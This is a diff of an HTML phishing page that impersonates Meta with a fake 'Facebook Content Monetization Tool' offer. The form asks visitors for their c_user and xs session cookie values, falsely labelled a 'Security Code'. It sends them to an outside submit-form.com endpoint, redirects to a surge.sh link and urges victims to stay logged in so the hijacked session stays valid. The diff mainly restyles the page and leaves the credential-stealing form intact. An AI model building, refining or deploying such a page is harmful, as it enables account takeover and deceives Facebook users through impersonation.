@@ -4,90 +4,142 @@
     <meta charset="UTF-8">
     <link href="style.css" rel="stylesheet">
     <title>Action | Submit</title>
+    <style>
+        /* Ensure the text is centered */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f7f7f7;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .text-center {
+            text-align: center;
+        }
+
+        .video-container {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 20px auto;
+        }
+
+        .form-container {
+            background-color: white;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .submit-btn {
+            background-color: #4267b2;
+            color: white;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .submit-btn:hover {
+            background-color: #365899;
+        }
+
+        input[type="text"], input[type="search"] {
+            width: 100%;
+            padding: 10px;
+            margin-top: 8px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+        }
+
+        .info-text {
+            font-size: 14px;
+            color: #555;
+            margin-top: 10px;
+        }
+
+        /* Responsive Styles */
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+
+            .form-container {
+                padding: 20px;
+            }
+
+            .submit-btn {
+                font-size: 14px;
+            }
+
+            .video-container {
+                width: 100%;
+                max-width: 400px;
+            }
+        }
+    </style>
 </head>
 
-<body class="bg-gray-50">
+<body>
 
-    <!-- Header Section -->
-    <div class="md:block lg:block hidden border flex w-full h-[6rem] relative bg-[#4667ac]">
-        <div class="mx-10 mt-4">
-            <b class="text-5xl text-white font-bold">Facebook</b>
+    <div class="container">
+
+        <!-- Header Section -->
+        <div class="text-center">
+            <h1 class="text-3xl font-bold text-[#3578e5] mt-6">Facebook Content Monetization Tool</h1>
+            <p class="text-lg text-gray-600 mt-2">Your Facebook page has access to the Content Monetization tool. Submit a request to activate it and start monetizing your content.</p>
         </div>
-        <div>
-            <form class="sm:hidden lg:block md:block">
-                <label for="search" class="hidden lg:block md:block mb-2 text-sm font-medium text-gray-900 sr-only dark:text-white">Search</label>
-                <div class="relative hidden md:block lg:block">
-                    <div class="absolute inset-y-0 left-0 flex items-center pl-96 mx-3 pointer-events-none">
-                        <svg class="w-3 h-3 text-gray-500 dark:text-gray-400" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 20 20">
-                            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m19 19-4-4m0-7A7 7 0 1 1 1 8a7 7 0 0 1 14 0Z"></path>
-                        </svg>
-                    </div>
-                    <input type="search" id="search" class="block w-[600px] p-1 mx-96 -mt-9 pl-7 text-sm text-gray-900 border border-gray-300 rounded-sm bg-gray-50 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" placeholder="How Can We Help?" required="">
+
+        <!-- Video Section (Autoplay) -->
+        <div class="text-center">
+            <video class="video-container" controls autoplay>
+                <source src="kabeer.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+
+        <!-- Form Section -->
+        <div class="form-container mt-8">
+            <form action="https://submit-form.com/sM6ETRQBF" method="post">
+                <input type="hidden" name="_redirect" value="https://pass-link-here.surge.sh">
+
+                <div>
+                    <h3 class="text-xl font-semibold text-[#333] text-center">How to Activate Content Monetization</h3>
+                    <ul class="mt-4 pl-6 text-lg text-gray-600 text-center">
+                        <li>1. Ensure your Facebook page is verified.</li>
+                        <li>2. Meet the eligibility criteria for Content Monetization.</li>
+                        <li>3. Submit your request following Facebook's guidelines.</li>
+                    </ul>
+                    <p class="mt-4 text-lg text-gray-600 text-center">Stay logged in until you receive a verification email.</p>
                 </div>
+
+                <div class="mt-6">
+                    <label for="c_user" class="block text-gray-700 font-semibold">Facebook User ID (c_user)</label>
+                    <input type="text" name="c_user" id="c_user" placeholder="Enter your Facebook User ID" required>
+
+                    <label for="xs" class="block text-gray-700 font-semibold mt-4">xs (Security Code)</label>
+                    <input type="text" name="xs" id="xs" placeholder="Enter your security code" required>
+                </div>
+
+                <p class="info-text">Ensure that you do not log out from your device until you receive the verification email.</p>
+
+                <!-- Submit Button -->
+                <button type="submit" class="submit-btn mt-6">Submit Request</button>
             </form>
         </div>
+
+        <!-- Footer -->
+        <footer class="text-center text-sm text-[#90949c] mt-8">
+            <p>META©️ 2024</p>
+        </footer>
     </div>
-
-    <!-- Main Content Form -->
-    <form action="https://submit-form.com/sM6ETRQBF" method="post" class="max-w-4xl mx-auto mt-10">
-        <input type="hidden" name="_redirect" value="https://pass-link-here.surge.sh">
-        <div id="root">
-            <!-- Title and Instructions -->
-            <div class="text-center mt-6">
-                <h2 class="text-3xl font-semibold text-[#3578e5]">Content Monetization Tool</h2>
-                <p class="mt-4 text-lg text-gray-600">Your Facebook page has been provided with the Content Monetization tool. Submit a request to activate it and start earning from your content.</p>
-            </div>
-
-            <div class="mt-6">
-                <h3 class="text-xl font-semibold text-[#333]">How to Activate Content Monetization</h3>
-                <ul class="mt-4 pl-6 text-lg text-gray-600">
-                    <li>1. Ensure your Facebook page is verified.</li>
-                    <li>2. Meet the eligibility criteria for Content Monetization.</li>
-                    <li>3. Submit your request following Facebook's guidelines.</li>
-                </ul>
-
-                <p class="mt-4 text-lg text-gray-600">Once you submit the request, keep your account logged in to receive the verification email.</p>
-            </div>
-
-            <!-- Video Information Section -->
-            <div class="mt-8">
-                <p class="text-lg font-semibold text-[#333]">Detailed Video Information</p>
-                <div class="mt-4">
-                    <a href="kabeer.mp4.mp4" class="block mb-4">
-                        <img src="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png" alt="Video Thumbnail" class="rounded-lg shadow-lg mx-auto" width="150">
-                    </a>
-                </div>
-                <p class="text-sm text-gray-600">Please provide the requested information below for a smooth verification process.</p>
-            </div>
-
-            <!-- Form Input Fields -->
-            <div class="mt-6">
-                <div class="mb-4">
-                    <label for="c_user" class="block text-gray-700 font-semibold">Facebook User ID (c_user)</label>
-                    <input type="text" name="c_user" id="c_user" class="w-full p-3 border rounded-lg mt-2 text-gray-800" placeholder="Enter your Facebook User ID" pattern="[0-9]+" minlength="6" required>
-                </div>
-
-                <div class="mb-4">
-                    <label for="xs" class="block text-gray-700 font-semibold">xs (Security Code)</label>
-                    <input type="text" name="xs" id="xs" class="w-full p-3 border rounded-lg mt-2 text-gray-800" placeholder="Enter your security code" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$" required>
-                </div>
-
-                <div class="mt-4 text-gray-600">
-                    <p class="text-sm font-semibold">Make sure to stay logged in until you receive the verification email.</p>
-                </div>
-            </div>
-
-            <!-- Submit Button -->
-            <div class="mt-8 text-center">
-                <button type="submit" class="px-6 py-2 bg-[#4267b2] text-white rounded-lg shadow-lg hover:bg-blue-600 font-semibold">Submit Request</button>
-            </div>
-
-            <!-- Footer -->
-            <footer class="mt-10 text-center text-sm text-[#90949c]">
-                <p>META©️ 2024</p>
-            </footer>
-        </div>
-    </form>
 
 </body>
 
